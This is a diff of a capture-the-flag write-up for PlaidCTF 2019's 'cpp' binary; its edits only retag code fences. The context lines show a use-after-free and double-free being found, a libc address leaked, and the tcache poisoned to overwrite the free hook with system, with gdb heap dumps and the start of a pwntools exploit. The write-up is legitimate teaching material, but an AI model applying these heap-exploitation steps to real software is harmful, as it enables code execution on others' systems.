@@ -1,7 +1,7 @@
 #    plaidctf 2019 cpp
 
 Let's take a look at the binary, and the libc version:
-```
+```console
 $    file cpp
 cpp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9ccb6196788d9ba1e3953535628a62549f3bcce8, stripped
 $    pwn checksec cpp
@@ -35,7 +35,7 @@ So we can see that we are dealing with a `64` bit binary, with all of the standa
 
 When we start reversing this program, we see that it was written in C++. As such it is a bit of a pain to reverse, so a lot of the reversing was done in gdb (and I didn't fully reverse out everything). First off we see that it prompts us with for our menu option with the promptMenu function in the:
 
-```
+```text
       menuOption = promptMenu();
       menuOptionCpy1 = (int)menuOption;
       minus2 = menuOptionCpy1 + -2;
@@ -49,7 +49,7 @@ Time to go through and reverse the rest of the functions.
 
 Looking through the code for the Add option, we see that it prompts us for values for name and buf:
 
-```
+```c
       operator<<<std--char_traits<char>>((basic_ostream *)cout,"name: ");
       operator>><char,std--char_traits<char>,std--allocator<char>>
                 ((basic_istream *)cin,(basic_string *)&local_f8);
@@ -58,7 +58,7 @@ Looking through the code for the Add option, we see that it prompts us for value
 
 After that it creates strings for the corresponding values which are stored in the heap. When we look at the data structure for the strings, we can see that it is a pointer to the name accompanied with the length of the string (in this case the name is `sasori` and buf is `deidara`):
 
-```
+```gdb
 gef➤  r
 Starting program: /Hackery/pod/modules/tcache/plaid19_cpp/cpp
 1. Add
@@ -166,7 +166,7 @@ Also one important thing to take note of (for later) the buf string is allocated
 
 For this option it starts off by prompting us for an index with the scan_index function (this function also prints the indexes with the corresponding names). It then checks to ensure that the index provided is greater than or equal to 0:
 
-```
+```text
     LODWORD(remove_index) = scanIndex();
     if ( (signed int)remove_index >= 0 )
     {
@@ -174,14 +174,14 @@ For this option it starts off by prompting us for an index with the scan_index f
 
 Proceeding that is a check to ensure that the index provided does have a corresponding object for it. If it isn't corresponding to an object, then this option does nothing:
 
-```
+```text
       index = getIndex();
       if ((-1 < index) &&
 ```
 
 However what is interesting with this, is we see that the object that is freed isn't related to the index we provide. It takes the value stored in `DAT_00303268`, subtracts 0x28 (in the pseudocode it shows `-10`, but the assembly code shows us the truth) from it, then deletes it. This doesn't necessarily coincide with the index we gave it:
 
-```
+```text
         piVar1 = DAT_00303268;
         ppvVar2 = (void **)(DAT_00303268 + -10);
         DAT_00303268 = DAT_00303268 + -0xc;
@@ -192,7 +192,7 @@ However what is interesting with this, is we see that the object that is freed i
 
 When we look in a debugger, we see that it always frees (since the strings are stored in the heap) the last added string:
 
-```
+```gdb
 gef➤  pie b *0x167e
 gef➤  pie run
 Stopped due to shared library event (no libraries added or removed)
@@ -281,7 +281,7 @@ With this we can see that we have a use after free bug, and a double free bug.
 
 Looking at the code in ghidra, we can see this essentially just prints the data of the chunk using `puts`:
 
-```
+```c
       if (iVar4 == 3) {
         iVar4 = FUN_00101ab0();
         if ((-1 < iVar4) &&
@@ -301,21 +301,21 @@ So for our exploitation process, we will have two parts. The first will be an in
 For the infoleak, we will be leaking a libc address from the smallbin. The smallbin contains a doubly linked list (a fwd and back pointer), which links back to the main arena (which is in the libc). We will first fill up the tcache by freeing `7` different things (keep in mind, each chunk we malloc will give us two chunks to free). With how the C++ heap works, we will need to allocate a name with the chunk that is `0x408` bytes large (I found this out via trial and error). If not, the chunk will end up in the fastbin and we will get a heap infoleak instead
 
 Here is what the chunk looks like prior to being placed in the small bin (input is `15935728`):
-```
+```gdb
 gef➤  x/4g 0x556b3a5941b0
 0x556b3a5941b0: 0x0 0x21
 0x556b3a5941c0: 0x3832373533393531  0x7f89a5507c00
 ```
 
 Here is what the chunk looks like after being placed in the small bin:
-```
+```gdb
 gef➤  x/4g 0x556b3a5941b0
 0x556b3a5941b0: 0x0 0x41
 0x556b3a5941c0: 0x7f89a5507cd0  0x7f89a5507cd0
 ```
 
 Using gef, we can even see it in the small bin:
-```
+```gdb
 gef➤  heap bins
 ───────────────────── Tcachebins for arena 0x7f89a5507c40 ─────────────────────
 Tcachebins[idx=0, size=0x10] count=7  ←  Chunk(addr=0x556b3a594200, size=0x20, flags=)  ←  Chunk(addr=0x556b3a594300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a593290, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a5942e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a5932f0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a593bd0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a593bb0, size=0x20, flags=PREV_INUSE)
@@ -354,7 +354,7 @@ With that, we can just view that chunk using the UAF, and we will have our infol
 
 So next up we will be writing the address of a system to the hook. Starting off, I will allocate all chunks from the tcache to clear it out. This will help us pass checks in malloc later on (when I tried this without clearing out the chunk, I failed some checks and the program crashed without giving us code execution). So how the tcache works, it will store free chunks in the tcache in a linked list. The linked list will point to the next chunk which will be allocated:
 
-```
+```gdb
 gef➤  heap bins
 ───────────────────── Tcachebins for arena 0x7f73349e5c40 ─────────────────────
 Tcachebins[idx=0, size=0x10] count=5  ←  Chunk(addr=0x565454052290, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x565454052380, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5654540522f0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5654540524b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x565454052490, size=0x20, flags=PREV_INUSE)
@@ -388,7 +388,7 @@ gef➤  x/4g 0x5654540522f0
 
 Here we essentially just allocated and freed `5` chunks (this is before we clear out the tcache). These all ended up in the tcache with `idx` `0`. We also see here that each one contains a pointer to the next chunk. So if we can overwrite the next pointer of a tcache entry to let's say the address of the free hook, we will be able to allocate a chunk to the free hook. With that, we will be able to write to it the address of the oneshot gadget. Before we allocate more chunks for this, the tcache looks like this:
 
-```
+```gdb
 gef➤  heap bins
 ───────────────────── Tcachebins for arena 0x7fcd5c1eac40 ─────────────────────
 Tcachebins[idx=0, size=0x10] count=1  ←  Chunk(addr=0x55c26839d200, size=0x20, flags=)
@@ -424,7 +424,7 @@ gef➤
 
 To do the write, we will execute a double free. How this will work, is that we will have two chunks allocated. Proceeding that, we will allocate two more chunks. Then we will remove the chunk at index `0`. Because of the bug where it only actually frees the last allocated chunk, it will free the second chunk twice (since it frees the last chunk allocated, but it will get rid of the chunk you specify). As a result, it will free the second chunk twice, and the tcache will look like this:
 
-```
+```gdb
 gef➤  heap bins
 ───────────────────── Tcachebins for arena 0x7f1219689c40 ─────────────────────
 Tcachebins[idx=0, size=0x10] count=7  ←  Chunk(addr=0x55aec1549290, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55aec1549290, size=0x20, flags=PREV_INUSE)  →  [loop detected]
@@ -461,7 +461,7 @@ Fastbins[idx=6, size=0x70] 0x00
 
 We can see here that in the tcache, the entry at address `0x55aec1549290` leads to `0x55aec1549290`, which is itself. Since we freed the same chunk twice, it was entered into the tcache twice. Now we will allocate a chunk and write to it the address of the free hook. Since there are two entries for the `0x55aec1549290` chunk, one will still be in the tcache and have a next pointer to the next chunk, which we will overwrite. After the overwrite, the tcache will look like this:
 
-```
+```gdb
 ggef➤  heap bins
 ───────────────────── Tcachebins for arena 0x7f2f01102c40 ─────────────────────
 Tcachebins[idx=0, size=0x10] count=2  ←  Chunk(addr=0x562ae9e281c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7f2f011048e8, size=0x0, flags=)
@@ -498,7 +498,7 @@ gef➤  x/g 0x7f2f011048e8
 
 So we can see that the address of the malloc hook is in the tcache. After that we can allocate it next and write to it:
 
-```
+```gdb
 gef➤  heap bins
 ───────────────────── Tcachebins for arena 0x7f2f01102c40 ─────────────────────
 Tcachebins[idx=1, size=0x20] count=1  ←  Chunk(addr=0x562ae9e27310, size=0x30, flags=PREV_INUSE)
@@ -540,7 +540,7 @@ As you can see, we were able to write over the free hook with the address of `sy
 
 Putting it all together, we get the following exploit. I ran this in Ubuntu `18.04`:
 
-```
+```python
 from pwn import *
 
 target = process('./cpp', env={"LD_PRELOAD":"./libc-2.27.so"})
@@ -627,7 +627,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $ python exploit.py 
 [+] Starting local process './cpp': pid 9020
 [*] '/Hackery/pod/modules/tcache/plaid19_cpp/libc-2.27.so'
